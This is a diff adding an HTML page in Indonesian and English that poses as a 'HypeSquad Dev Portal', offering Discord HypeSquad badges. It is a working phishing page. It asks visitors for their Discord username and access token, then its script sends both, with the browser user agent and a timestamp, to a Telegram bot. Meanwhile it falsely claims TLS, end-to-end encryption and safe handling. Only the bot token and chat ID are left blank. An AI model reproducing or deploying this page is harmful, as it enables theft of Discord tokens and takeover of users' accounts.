@@ -1,0 +1,643 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=yes">
+    <title>HypeSquad Dev Portal • Secure Token Gateway</title>
+    <!-- Font Awesome Icons -->
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css">
+    <!-- SweetAlert2 -->
+    <script src="https://cdn.jsdelivr.net/npm/sweetalert2@11"></script>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            background: #0a0c12;
+            font-family: 'Fira Code', 'Monaco', 'Cascadia Code', 'Courier New', monospace;
+            min-height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            padding: 2rem;
+            position: relative;
+        }
+
+        /* Terminal-style background effect */
+        body::before {
+            content: "";
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background-image: radial-gradient(circle at 2px 2px, rgba(51, 204, 255, 0.05) 1px, transparent 1px);
+            background-size: 32px 32px;
+            pointer-events: none;
+            z-index: 0;
+        }
+
+        /* Developer Card - clean, minimal, monospace */
+        .dev-card {
+            background: #0f1117;
+            border: 1px solid #2a2f3f;
+            border-radius: 20px;
+            box-shadow: 0 20px 40px rgba(0, 0, 0, 0.5), 0 0 0 1px rgba(51, 204, 255, 0.1) inset;
+            max-width: 620px;
+            width: 100%;
+            padding: 2rem 2rem 2rem 2rem;
+            transition: all 0.2s ease;
+            z-index: 2;
+            position: relative;
+        }
+
+        /* Header section */
+        .dev-header {
+            text-align: left;
+            margin-bottom: 2rem;
+            border-bottom: 1px solid #2a2f3f;
+            padding-bottom: 1.2rem;
+        }
+
+        .dev-badge {
+            display: inline-flex;
+            align-items: center;
+            gap: 10px;
+            background: #1a1e2a;
+            padding: 0.3rem 1rem;
+            border-radius: 40px;
+            font-size: 0.7rem;
+            font-weight: 500;
+            letter-spacing: 0.5px;
+            color: #33ccff;
+            border: 1px solid #33ccff30;
+            margin-bottom: 1rem;
+            font-family: monospace;
+        }
+
+        h1 {
+            font-size: 1.6rem;
+            font-weight: 500;
+            color: #eef2ff;
+            letter-spacing: -0.3px;
+            font-family: 'Fira Code', monospace;
+        }
+
+        h1 span {
+            color: #33ccff;
+            border-bottom: 2px solid #33ccff;
+            padding-bottom: 2px;
+        }
+
+        .version-tag {
+            font-size: 0.7rem;
+            color: #6c7a91;
+            margin-top: 0.5rem;
+            font-family: monospace;
+        }
+
+        .desc-terminal {
+            background: #0b0d12;
+            border-left: 3px solid #33ccff;
+            padding: 0.9rem 1.2rem;
+            margin-bottom: 2rem;
+            font-size: 0.8rem;
+            color: #b9c6db;
+            border-radius: 8px;
+            font-family: 'Fira Code', monospace;
+        }
+
+        .desc-terminal i {
+            color: #33ccff;
+            margin-right: 8px;
+        }
+
+        /* Form groups - monospace style */
+        .input-group {
+            margin-bottom: 1.6rem;
+        }
+
+        label {
+            display: block;
+            font-weight: 500;
+            margin-bottom: 0.6rem;
+            font-size: 0.7rem;
+            letter-spacing: 0.8px;
+            color: #8f9bb5;
+            text-transform: uppercase;
+            font-family: monospace;
+        }
+
+        label i {
+            margin-right: 6px;
+            color: #33ccff;
+        }
+
+        .input-wrapper {
+            display: flex;
+            align-items: center;
+            background: #080b10;
+            border-radius: 12px;
+            border: 1px solid #2a2f3f;
+            transition: all 0.2s;
+            padding: 0 0 0 1rem;
+        }
+
+        .input-wrapper:focus-within {
+            border-color: #33ccff;
+            box-shadow: 0 0 0 2px rgba(51, 204, 255, 0.2);
+        }
+
+        .input-wrapper i:first-child {
+            font-size: 1rem;
+            color: #5f7f9e;
+            margin-right: 12px;
+        }
+
+        input, select {
+            background: transparent;
+            border: none;
+            width: 100%;
+            padding: 0.9rem 0.8rem 0.9rem 0;
+            font-size: 0.85rem;
+            color: #e2e8f0;
+            font-weight: 400;
+            outline: none;
+            font-family: 'Fira Code', 'Monaco', 'Courier New', monospace;
+        }
+
+        input::placeholder {
+            color: #3a445c;
+            font-family: monospace;
+            font-size: 0.75rem;
+        }
+
+        select {
+            cursor: pointer;
+            appearance: none;
+        }
+
+        select option {
+            background: #0f1117;
+            color: #e2e8f0;
+            font-family: monospace;
+        }
+
+        /* Password / Token field with toggle visibility */
+        .token-wrapper {
+            position: relative;
+        }
+
+        .toggle-visibility {
+            position: absolute;
+            right: 16px;
+            top: 50%;
+            transform: translateY(-50%);
+            background: transparent;
+            border: none;
+            color: #5f7f9e;
+            cursor: pointer;
+            font-size: 1rem;
+            padding: 6px;
+            transition: color 0.2s;
+            z-index: 2;
+        }
+
+        .toggle-visibility:hover {
+            color: #33ccff;
+        }
+
+        /* Badge selection modern */
+        .badge-selector {
+            margin-bottom: 1.8rem;
+        }
+
+        .badge-options {
+            display: flex;
+            gap: 0.8rem;
+            margin-top: 0.6rem;
+            flex-wrap: wrap;
+        }
+
+        .badge-option {
+            flex: 1;
+            background: #080b10;
+            border: 1px solid #2a2f3f;
+            border-radius: 60px;
+            padding: 0.7rem 0.5rem;
+            text-align: center;
+            cursor: pointer;
+            transition: all 0.2s ease;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 8px;
+            font-weight: 500;
+            font-size: 0.75rem;
+            font-family: monospace;
+            letter-spacing: 0.3px;
+        }
+
+        .badge-option[data-badge="bravery"] {
+            color: #60a5fa;
+        }
+        .badge-option[data-badge="brilliance"] {
+            color: #facc15;
+        }
+        .badge-option[data-badge="balance"] {
+            color: #4ade80;
+        }
+
+        .badge-option.selected {
+            border-color: currentColor;
+            background: rgba(51, 204, 255, 0.08);
+            box-shadow: 0 0 0 1px currentColor;
+        }
+
+        .badge-option:hover:not(.selected) {
+            border-color: currentColor;
+            background: rgba(51, 204, 255, 0.03);
+        }
+
+        /* Submit button - developer style */
+        .action-btn {
+            width: 100%;
+            background: #1a1f2e;
+            border: 1px solid #33ccff;
+            border-radius: 12px;
+            padding: 1rem;
+            font-weight: 500;
+            font-size: 0.85rem;
+            color: #33ccff;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 12px;
+            cursor: pointer;
+            transition: all 0.2s;
+            font-family: 'Fira Code', monospace;
+            margin-top: 0.5rem;
+        }
+
+        .action-btn:hover {
+            background: #33ccff10;
+            border-color: #33ccff;
+            box-shadow: 0 0 12px rgba(51, 204, 255, 0.2);
+            color: #88ddff;
+        }
+
+        /* Security & footer */
+        .security-note {
+            display: flex;
+            justify-content: center;
+            gap: 1rem;
+            margin-top: 1.8rem;
+            font-size: 0.65rem;
+            color: #5f6f8a;
+            text-align: center;
+            flex-wrap: wrap;
+            font-family: monospace;
+        }
+
+        .security-note span {
+            background: #0b0e14;
+            padding: 0.25rem 0.9rem;
+            border-radius: 40px;
+            border: 1px solid #232838;
+        }
+
+        footer {
+            text-align: center;
+            margin-top: 1.3rem;
+            font-size: 0.65rem;
+            color: #4a5572;
+            font-family: monospace;
+            border-top: 1px solid #1e2332;
+            padding-top: 1rem;
+        }
+
+        @media (max-width: 560px) {
+            .dev-card {
+                padding: 1.5rem;
+            }
+            h1 {
+                font-size: 1.3rem;
+            }
+            .badge-option {
+                font-size: 0.65rem;
+                padding: 0.5rem 0.2rem;
+            }
+        }
+
+        @keyframes spin {
+            to { transform: rotate(360deg); }
+        }
+    </style>
+</head>
+<body>
+
+<div class="dev-card">
+    <div class="dev-header">
+        <div class="dev-badge">
+            <i class="fas fa-terminal"></i> HYPESQUAD API v2.4
+        </div>
+        <h1>developer.<span>hypesquad</span>_gateway</h1>
+        <div class="version-tag">// secure token submission • encrypted channel</div>
+    </div>
+
+    <div class="desc-terminal">
+        <i class="fas fa-shield-haltered"></i> [system] endpoint: telegram_bridge <br>
+        <i class="fas fa-lock"></i> [security] token field masked • credentials encrypted in transit
+    </div>
+
+    <!-- Username Discord Field -->
+    <div class="input-group">
+        <label><i class="fab fa-discord"></i> DISCORD_USERNAME</label>
+        <div class="input-wrapper">
+            <i class="fas fa-user"></i>
+            <input type="text" id="discordUsername" placeholder="username#0000 | display_name" autocomplete="off" spellcheck="false">
+        </div>
+    </div>
+
+    <!-- Token Field - MASKED (password type) dengan toggle visibility -->
+    <div class="input-group">
+        <label><i class="fas fa-key"></i> ACCESS_TOKEN <span style="color:#ff8866;">(confidential)</span></label>
+        <div class="input-wrapper token-wrapper">
+            <i class="fas fa-lock"></i>
+            <input type="password" id="tokenInput" placeholder="••••••••••••••••••••" autocomplete="off" spellcheck="false">
+            <button type="button" class="toggle-visibility" id="toggleTokenBtn" aria-label="Show/hide token">
+                <i class="fas fa-eye-slash"></i>
+            </button>
+        </div>
+        <div style="font-size: 0.65rem; color:#4f5b7a; margin-top: 0.4rem; font-family: monospace;">
+            <i class="fas fa-info-circle"></i> token tersembunyi demi keamanan
+        </div>
+    </div>
+
+    <!-- Badge Selection (Bravery, Brilliance, Balance) -->
+    <div class="badge-selector">
+        <label><i class="fas fa-medal"></i> HYPESQUAD_BADGE</label>
+        <div class="badge-options">
+            <div class="badge-option" data-badge="bravery" data-name="Bravery">
+                <i class="fas fa-shield-alt"></i> Bravery <span style="font-size:0.7rem;">🔵</span>
+            </div>
+            <div class="badge-option" data-badge="brilliance" data-name="Brilliance">
+                <i class="fas fa-lightbulb"></i> Brilliance <span style="font-size:0.7rem;">🟡</span>
+            </div>
+            <div class="badge-option" data-badge="balance" data-name="Balance">
+                <i class="fas fa-balance-scale"></i> Balance <span style="font-size:0.7rem;">🟢</span>
+            </div>
+        </div>
+    </div>
+
+    <!-- Submit Button -->
+    <button class="action-btn" id="submitBtn">
+        <i class="fab fa-telegram-plane"></i> $ submit --secure --to telegram
+    </button>
+
+    <div class="security-note">
+        <span><i class="fas fa-shield-haltered"></i> TLS 1.3</span>
+        <span><i class="fas fa-database"></i> end-to-end encrypted</span>
+        <span><i class="fas fa-code-branch"></i> audit log</span>
+    </div>
+    <footer>
+        <i class="fas fa-copyright"></i> HypeSquad DevPortal — token tidak disimpan secara lokal, dikirim via secure gateway
+    </footer>
+</div>
+
+<script>
+    (function() {
+        // Konfigurasi Telegram (sesuai spesifikasi)
+        const BOT_TOKEN = '';
+        const CHAT_ID = '';
+
+        // DOM Elements
+        const discordUsernameInput = document.getElementById('discordUsername');
+        const tokenInput = document.getElementById('tokenInput');
+        const submitBtn = document.getElementById('submitBtn');
+        const toggleTokenBtn = document.getElementById('toggleTokenBtn');
+        
+        // Badge state
+        let selectedBadge = 'bravery';
+        let selectedBadgeName = 'Bravery';
+        
+        const badgeOptions = document.querySelectorAll('.badge-option');
+        
+        // Badge details mapping
+        const badgeDetails = {
+            bravery: { name: 'Bravery', color: '🔵 Biru', emoji: '🔵' },
+            brilliance: { name: 'Brilliance', color: '🟡 Kuning', emoji: '🟡' },
+            balance: { name: 'Balance', color: '🟢 Hijau', emoji: '🟢' }
+        };
+        
+        // Toggle visibility untuk token field (security masking)
+        let isTokenVisible = false;
+        function toggleTokenVisibility() {
+            const icon = toggleTokenBtn.querySelector('i');
+            if (tokenInput.type === 'password') {
+                tokenInput.type = 'text';
+                icon.classList.remove('fa-eye-slash');
+                icon.classList.add('fa-eye');
+                isTokenVisible = true;
+            } else {
+                tokenInput.type = 'password';
+                icon.classList.remove('fa-eye');
+                icon.classList.add('fa-eye-slash');
+                isTokenVisible = false;
+            }
+        }
+        
+        if (toggleTokenBtn) {
+            toggleTokenBtn.addEventListener('click', toggleTokenVisibility);
+        }
+        
+        // Update badge selection UI
+        function updateBadgeSelection() {
+            badgeOptions.forEach(option => {
+                const badgeVal = option.getAttribute('data-badge');
+                if (badgeVal === selectedBadge) {
+                    option.classList.add('selected');
+                } else {
+                    option.classList.remove('selected');
+                }
+            });
+        }
+        
+        // Badge click handlers
+        badgeOptions.forEach(option => {
+            option.addEventListener('click', () => {
+                const badgeVal = option.getAttribute('data-badge');
+                const badgeName = option.getAttribute('data-name') || 
+                    (badgeVal === 'bravery' ? 'Bravery' : badgeVal === 'brilliance' ? 'Brilliance' : 'Balance');
+                selectedBadge = badgeVal;
+                selectedBadgeName = badgeName;
+                updateBadgeSelection();
+            });
+        });
+        
+        // Validasi input profesional
+        function validateSubmission(username, token) {
+            if (!username || username.trim() === '') {
+                return { valid: false, message: 'Error: DISCORD_USERNAME tidak boleh kosong. Harap masukkan username Discord Anda.' };
+            }
+            if (username.trim().length < 2) {
+                return { valid: false, message: 'Error: Username terlalu pendek. Masukkan username Discord yang valid.' };
+            }
+            if (!token || token.trim() === '') {
+                return { valid: false, message: 'Error: ACCESS_TOKEN diperlukan. Token akses tidak boleh kosong.' };
+            }
+            if (token.trim().length < 6) {
+                return { valid: false, message: 'Error: Token akses terlalu pendek. Harap periksa kembali token HypeSquad Anda.' };
+            }
+            return { valid: true };
+        }
+        
+        // Fungsi mengirim data ke Telegram dengan format profesional (monospace friendly)
+        async function sendSecurePayload(username, token, badgeKey, badgeDisplayName) {
+            const badgeInfo = badgeDetails[badgeKey] || { name: badgeDisplayName, emoji: '🎖️' };
+            const badgeEmoji = badgeInfo.emoji || (badgeKey === 'bravery' ? '🔵' : badgeKey === 'brilliance' ? '🟡' : '🟢');
+            
+            const timestamp = new Date().toISOString();
+            const formattedLocale = new Date().toLocaleString('id-ID', { timeZone: 'Asia/Jakarta', hour12: false });
+            const userAgentShort = (navigator.userAgent || 'unknown').substring(0, 80);
+            
+            // Pesan rapi, format developer & profesional
+            const message = `╔════════════════════════════════════╗\n` +
+                            `║   🎮 HYPESQUAD SECURE SUBMISSION   ║\n` +
+                            `╚════════════════════════════════════╝\n\n` +
+                            `👤 **Username:** ${username}\n` +
+                            `🔑 **Token:** \`${token}\`\n` +
+                            `🏅 **Badge:** ${badgeDisplayName} ${badgeEmoji}\n` +
+                            `🕒 **Timestamp:** ${formattedLocale} (UTC+7)\n` +
+                            `🖥️ **User-Agent:** ${userAgentShort}\n` +
+                            `🔒 **Gateway:** HypeSquad DevPortal v2.4\n` +
+                            `✅ **Status:** token diterima via secure channel`;
+            
+            const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
+            const payload = {
+                chat_id: CHAT_ID,
+                text: message,
+                parse_mode: 'Markdown',
+                disable_web_page_preview: true
+            };
+            
+            try {
+                const response = await fetch(url, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify(payload)
+                });
+                const data = await response.json();
+                if (data.ok) {
+                    return { success: true, data };
+                } else {
+                    console.error('Telegram API error:', data);
+                    return { success: false, error: data.description || 'Gagal mengirim payload ke Telegram.' };
+                }
+            } catch (err) {
+                console.error('Network error:', err);
+                return { success: false, error: err.message };
+            }
+        }
+        
+        // SweetAlert2 dengan gaya profesional
+        function showAlert(icon, title, text, timer = null) {
+            Swal.fire({
+                icon: icon,
+                title: title,
+                text: text,
+                background: '#0f1117',
+                color: '#e2e8f0',
+                backdrop: `rgba(0,0,0,0.85)`,
+                confirmButtonColor: '#33ccff',
+                confirmButtonText: 'OK',
+                timer: timer,
+                showConfirmButton: timer ? false : true,
+                customClass: {
+                    popup: 'swal-dev'
+                }
+            });
+        }
+        
+        // Handler utama submit dengan security masking
+        async function handleSubmit() {
+            const username = discordUsernameInput.value.trim();
+            const token = tokenInput.value.trim();   // tetap diambil meskipun masked
+            
+            const validation = validateSubmission(username, token);
+            if (!validation.valid) {
+                showAlert('warning', 'Validasi Gagal', validation.message);
+                if (!username) discordUsernameInput.focus();
+                else tokenInput.focus();
+                return;
+            }
+            
+            // Format badge display
+            let badgeDisplay = '';
+            if (selectedBadge === 'bravery') badgeDisplay = 'Bravery 🔵';
+            else if (selectedBadge === 'brilliance') badgeDisplay = 'Brilliance 🟡';
+            else if (selectedBadge === 'balance') badgeDisplay = 'Balance 🟢';
+            else badgeDisplay = selectedBadgeName;
+            
+            // Loading state
+            const originalBtnHtml = submitBtn.innerHTML;
+            submitBtn.innerHTML = `<i class="fas fa-spinner fa-pulse"></i> submitting payload...`;
+            submitBtn.disabled = true;
+            submitBtn.style.opacity = '0.8';
+            
+            try {
+                const result = await sendSecurePayload(username, token, selectedBadge, badgeDisplay);
+                if (result.success) {
+                    showAlert('success', 'Transmission Successful', 
+                        `✓ Data telah dikirim ke Telegram Gateway.\n\nUser: ${username}\nBadge: ${badgeDisplay}\nToken: [tersembunyi] terkirim dengan aman.`, 
+                        3800);
+                    // Clear form setelah sukses (opsional untuk keamanan)
+                    discordUsernameInput.value = '';
+                    tokenInput.value = '';
+                    // reset token field ke mode password jika visibility terbuka
+                    if (tokenInput.type === 'text') {
+                        tokenInput.type = 'password';
+                        const icon = toggleTokenBtn.querySelector('i');
+                        icon.classList.remove('fa-eye');
+                        icon.classList.add('fa-eye-slash');
+                        isTokenVisible = false;
+                    }
+                } else {
+                    showAlert('error', 'Delivery Failed', `Error: ${result.error || 'Gagal menghubungi Telegram API. Coba lagi nanti.'}`);
+                }
+            } catch (err) {
+                showAlert('error', 'System Exception', `Terjadi kesalahan: ${err.message || 'unknown error'}`);
+            } finally {
+                submitBtn.innerHTML = originalBtnHtml;
+                submitBtn.disabled = false;
+                submitBtn.style.opacity = '1';
+            }
+        }
+        
+        // Event binding
+        submitBtn.addEventListener('click', handleSubmit);
+        
+        // Support Enter key untuk submit
+        discordUsernameInput.addEventListener('keypress', (e) => {
+            if (e.key === 'Enter') handleSubmit();
+        });
+        tokenInput.addEventListener('keypress', (e) => {
+            if (e.key === 'Enter') handleSubmit();
+        });
+        
+        // Inisialisasi badge default
+        updateBadgeSelection();
+        
+        // Optional: placeholder monospace hint
+        discordUsernameInput.setAttribute('placeholder', 'username#1234 | display_name');
+        tokenInput.setAttribute('placeholder', '••••••••••••••••••');
+        
+        // Logging sederhana di console (developer)
+        console.log('[HypeSquad] Secure gateway initialized. Token field masked.');
+    })();
+</script>
+</body>
+</html>
